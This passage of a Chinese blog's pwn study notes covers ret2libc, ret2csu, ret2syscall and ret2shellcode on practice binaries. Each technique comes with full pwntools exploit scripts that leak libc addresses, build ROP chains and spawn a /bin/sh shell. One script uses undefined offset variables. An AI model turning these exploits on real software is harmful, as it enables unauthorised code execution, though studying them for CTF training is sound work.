class="string">&#x27;./question_5_x86&#x27;</span> </span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile) </span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)  <span class="comment"># 引入libc共享库文件</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span></span><br><span class="line">leak_write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]   <span class="comment"># write@got</span></span><br><span class="line">write_symbols = elf.symbols[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># main函数中的真实write地址</span></span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>] <span class="comment"># dofunc_addr</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * padding, write_symbols, return_addr, <span class="number">1</span>, leak_write_got, <span class="number">4</span>, return_addr])</span><br><span class="line"><span class="comment"># 溢出 -&gt; 调用dofunc中的write(), dofunc_ret, argc1:1, argc2:write@got, argc3:4, 返回到dofunc</span></span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;byebye&quot;</span>)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))  <span class="comment"># 只需要最多读取四个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基地址</span></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh/system_addr</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh:&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">b&#x27;a&#x27;</span> * padding, system_addr, return_addr, binsh_addr])</span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload2)</span><br><span class="line">io.recvuntil(<span class="string">&quot;byebye&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h6 id="ret2csu-x64"><a href="#ret2csu-x64" class="headerlink" title="ret2csu x64"></a>ret2csu x64</h6><p>通过修改控制 gadget 的段落来达到控制参数的目的  (输出地址)</p>
<ul>
<li>__libc_csu_init</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011D8 loc_4011D8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011D8                 mov     rdx, r14</span><br><span class="line">.text:00000000004011DB                 mov     rsi, r13</span><br><span class="line">.text:00000000004011DE                 mov     edi, r12d</span><br><span class="line">.text:00000000004011E1                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:00000000004011E5                 add     rbx, 1</span><br><span class="line">.text:00000000004011E9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011EC                 jnz     short loc_4011D8</span><br><span class="line">.text:00000000004011EE</span><br><span class="line">.text:00000000004011EE loc_4011EE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011EE                 add     rsp, 8</span><br><span class="line">.text:00000000004011F2                 pop     rbx     &lt;-- !(从这里开始 因为上面的add 指令我们并不需要)!</span><br><span class="line">.text:00000000004011F3                 pop     rbp</span><br><span class="line">.text:00000000004011F4                 pop     r12</span><br><span class="line">.text:00000000004011F6                 pop     r13</span><br><span class="line">.text:00000000004011F8                 pop     r14</span><br><span class="line">.text:00000000004011FA                 pop     r15</span><br><span class="line">.text:00000000004011FC                 retn</span><br></pre></td></tr></table></figure>

<p><strong>执行思路</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 溢出</span><br><span class="line">2 从0x4011F2 开始，retn = 0x4011D8(上面的一段)</span><br><span class="line">3 r12=argc1; r13=argc2; r14=argc3</span><br><span class="line">4 jnz xxx , 只需要让rbx = 0; rbp = 1 即可</span><br><span class="line">5 call xxxx [r15+rbx*8]: 只需要使 rbx = 0 ; r15 = 要跳转的地址就可以了</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile= <span class="string">&#x27;./question_5_plus_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x10</span></span><br><span class="line">leak_func_name =<span class="string">&#x27;write&#x27;</span>  </span><br><span class="line">leak_func_got = elf.got[leak_func_name]</span><br><span class="line">return_addr = elf.symbols[<span class="string">&#x27;dofunc&#x27;</span>]</span><br><span class="line">write_sym = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rbx_addr = <span class="number">0x4011F2</span>  <span class="comment"># __libc_csu_init 的下面一段 </span></span><br><span class="line">rbx=<span class="number">0</span></span><br><span class="line">rbp=<span class="number">1</span></span><br><span class="line">r12=<span class="number">1</span></span><br><span class="line">r13=leak_func_got <span class="comment"># write(1,leak_func_got,6)</span></span><br><span class="line">r14=<span class="number">6</span></span><br><span class="line">r15 = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_rdx_r14_addr = <span class="number">0x4011D8</span>  <span class="comment"># __libc_csu_init 的上面一段</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span>* padding </span><br><span class="line">payload += flat([pop_rbx_addr , rbx , rbp , r12 , r13 , r14 , r15 , mov_rdx_r14_addr])</span><br><span class="line">payload +=  p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span> + p64(return_addr)</span><br><span class="line"></span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;bye&#x27;</span>)</span><br><span class="line">write_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_addr = write_addr - wirte_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr:&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + system_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = libc_addr + bin_sh_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh_addr:&#x27;</span>,<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 = b&#x27;a&#x27;* padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span></span><br><span class="line"><span class="comment"># delimiter = &#x27;input:&#x27;</span></span><br><span class="line"><span class="comment"># io.sendlineafter(delimiter, payload2)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h6 id="ret2syscall-0x32-0x64"><a href="#ret2syscall-0x32-0x64" class="headerlink" title="ret2syscall 0x32 &#x2F; 0x64"></a>ret2syscall 0x32 &#x2F; 0x64</h6><p>基本rop之一，意为call system，控制程序执行系统调用，获取shell<br>利用的是 <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code><br>向寄存器存放的参数分别为:</p>
<ul>
<li>系统调用号，即 eax 应该为 <code>0xb</code>  ; <strong>此为 execve 对应的系统调用号</strong></li>
<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
<li>int 0x80（触发中断)<br><strong>0x32 位例题</strong><br>0x01: 先 ROPgadget</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">ROPgadget --binary rop --string &#x27;/bin/sh&#x27;</span><br><span class="line">ROPgadget --binary rop --only &#x27;int&#x27;  (int 0x80)</span><br></pre></td></tr></table></figure>

<p>0x02 编写脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="number">0x10</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(pop_eax_ret) + p32(<span class="number">0x0b</span>)  <span class="comment"># 为 execve 对应的系统调用号, 固定为0x0b</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0x0</span>) + p32(<span class="number">0x0</span>) + p32(bin_sh) + p32(int_0x80)</span><br></pre></td></tr></table></figure>

<p><strong>0x64 位例题</strong><br>和32位大差不差，就是传参方面要用寄存器传参</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + rdi_addr + bin_sh + eax_rdx_ebx_addr + p64(<span class="number">0x3b</span>）</span><br><span class="line">payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0X0</span>) + rsi_addr + p64(<span class="number">0x0</span>) + syscall_addr <span class="comment">#这里的eax其实就是rax</span></span><br></pre></td></tr></table></figure>


<h6 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h6><p>源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="type">int</span> pagesize = getpagesize();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = buf2;</span><br><span class="line">        addr = (addr &gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>;</span><br><span class="line">        mprotect(addr, pagesize, <span class="number">7</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf2, buf, <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>攻击思路</strong></p>
<ul>
<li>buf 栈中填入 shellcode , <code>\x00</code> 补满到 padding 处</li>
<li>rbp: junk 数据  (其实 <code>\x00</code> 补满到 padding 处已经补满 rbp 了 (padding &#x3D; padding2rbp + 8))</li>
<li>ret 到 buf2 , 执行 shellcode</li>
</ul>
<p>计算溢出长度 (等待 read 后输入八字节长度 (x64) 后输入)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance $rsp $rbp</span><br><span class="line">0x7fffffffdb00-&gt;0x7fffffffdc10 is 0x110 bytes (0x22 words)</span><br></pre></td></tr></table></figure>
<p>rsp 到 rbp 的长度为 <code>0x110</code> , 还需要加 <code>rbp</code> 的八字节</p>
<p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">pwnfile = <span class="string">&#x27;./question_6_3_x64&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">buf2_ret = elf.symbols[<span class="string">&#x27;buf2&#x27;</span>]</span><br><span class="line">padding2rbp = <span class="number">0x110</span></span><br><span class="line">padding = padding2rbp + <span class="number">8</span></span><br><span class="line">payload = asm(shellcraft.sh()).ljust(padding, <span class="string">b&#x27;\x00&#x27;</span>) + p64(buf2_ret)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;input:&#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong><code>.ljust(padding, b&#39;\x00&#39;)</code>： 用 <code>\x00</code> 填充至 <code>padding</code> 长度，确保覆盖到返回地址</strong></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/topics">Topics</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-%E5%8A%A8%E8%B0%83%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">GDB 动调基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Assembly-%E4%B8%80%E8%88%AC%E6%8C%87%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">Assembly 一般指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-%E4%B8%80%E8%88%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">gdb 一般操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwntools%E5%BA%93-%E4%B8%80%E8%88%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">4.</span> <span class="toc-text">pwntools库 一般操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2X-%E4%BE%8B%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">ret2X 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC-ret2text-x86"><span class="toc-number">5.0.1.</span> <span class="toc-text">基本 ret2text x86</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#esp%E5%AF%BB%E5%9D%80%E7%9A%84-ret2text-x86"><span class="toc-number">5.0.2.</span> <span class="toc-text">esp寻址的 ret2text x86</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%ACret2text-x64%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.0.3.</span> <span class="toc-text">基本ret2text x64程序</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2text-%E4%BC%A0%E5%8F%82-x86"><span class="toc-number">5.0.4.</span> <span class="toc-text">ret2text 传参 x86</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2text-%E4%BC%A0%E5%8F%82-x64"><span class="toc-number">5.0.5.</span> <span class="toc-text">ret2text 传参 x64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2libc-x64"><span class="toc-number">5.0.6.</span> <span class="toc-text">ret2libc x64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2libc-x86"><span class="toc-number">5.0.7.</span> <span class="toc-text">ret2libc x86</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2csu-x64"><span class="toc-number">5.0.8.</span> <span class="toc-text">ret2csu x64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2syscall-0x32-0x64"><span class="toc-number">5.0.9.</span> <span class="toc-text">ret2syscall 0x32 &#x2F; 0x64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">5.0.10.</span> <span class="toc-text">ret2shellcode</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/25/pwn-study-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/25/pwn-study-note/&text=pwn_study_note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/25/pwn-study-note/&is_video=false&description=pwn_study_note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=pwn_study_note&body=Check out this article: http://example.com/2025/03/25/pwn-study-note/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/25/pwn-study-note/&name=pwn_study_note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/25/pwn-study-note/&t=pwn_study_note"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    xekOnerR
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/topics">Topics</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
